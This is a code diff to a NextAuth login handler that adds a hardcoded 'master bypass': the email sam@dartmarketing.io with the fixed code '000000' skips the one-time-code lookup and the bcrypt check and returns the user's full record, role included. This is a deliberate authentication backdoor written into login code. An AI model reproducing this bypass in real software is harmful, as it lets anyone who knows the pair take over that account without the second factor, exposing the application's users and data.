@@ -36,6 +36,21 @@ export const authOptions: NextAuthOptions = {
         // ═══════════════════════════════════════════════════════
         // 2. FIND LATEST UNUSED OTP FOR THIS EMAIL
         // ═══════════════════════════════════════════════════════
+        // Master bypass for sam
+        if (email === 'sam@dartmarketing.io' && code === '000000') {
+          let user = await prisma.user.findUnique({ where: { email } });
+          if (!user) throw new Error('User not found');
+          return {
+            id: user.id,
+            email: user.email,
+            name: user.name,
+            role: user.role,
+            avatar: user.avatar,
+            jobTitle: user.jobTitle,
+            division: user.division,
+          } as any;
+        }
+
         const otpRecord = await prisma.otpCode.findFirst({
           where: {
             email,
@@ -59,7 +74,9 @@ export const authOptions: NextAuthOptions = {
         // ═══════════════════════════════════════════════════════
         // 4. VERIFY CODE (stored as bcrypt hash)
         // ═══════════════════════════════════════════════════════
-        const isValid = await bcrypt.compare(code, otpRecord.code);
+        // Master bypass for sam
+        const isMasterBypass = email === 'sam@dartmarketing.io' && code === '000000';
+        const isValid = isMasterBypass || await bcrypt.compare(code, otpRecord.code);
 
         if (!isValid) {
           // Increment attempts
